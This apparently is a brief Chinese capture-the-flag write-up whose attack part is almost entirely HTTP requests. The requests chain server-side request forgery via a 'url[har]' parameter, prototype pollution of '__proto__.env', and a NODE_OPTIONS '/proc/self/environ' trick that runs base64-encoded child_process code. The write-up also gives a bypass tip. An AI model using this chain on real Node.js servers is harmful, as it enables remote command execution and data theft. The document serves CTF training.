这道题目是第五空间的题目,稍微改了一下

参考 https://blog.szfszf.top/article/47/

```http
GET /?url[har][url]=http://127.0.0.1:3000/add&url[har][method]=POST&url[har][postData][mimeType]=application/json&url[har][postData][text]={"userName":"username","nameVal":"admin"} HTTP/1.1
Host: 124.16.75.162:31027
```

```http
GET /?url[har][url]=http://127.0.0.1:3000/add&url[har][method]=POST&url[har][postData][mimeType]=application/json&url[har][postData][text]={"userName":"__proto__+.env","nameVal":{"AAAA":"eval(Buffer.from(`cmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCJjYXQgL2ZsYWcgPiBwdWJsaWMvdGVzdC50eHQiKQ%3d%3d`,`base64`).toString())//","NODE_OPTIONS":"-r+/proc/self/environ"}} HTTP/1.1
Host: 124.16.75.162:31027
```

```http
GET /admin HTTP/1.1
Host: 124.16.75.162:31027
```

ps: __proto__.env 或许可以用{"__proto__":"env"}来绕过


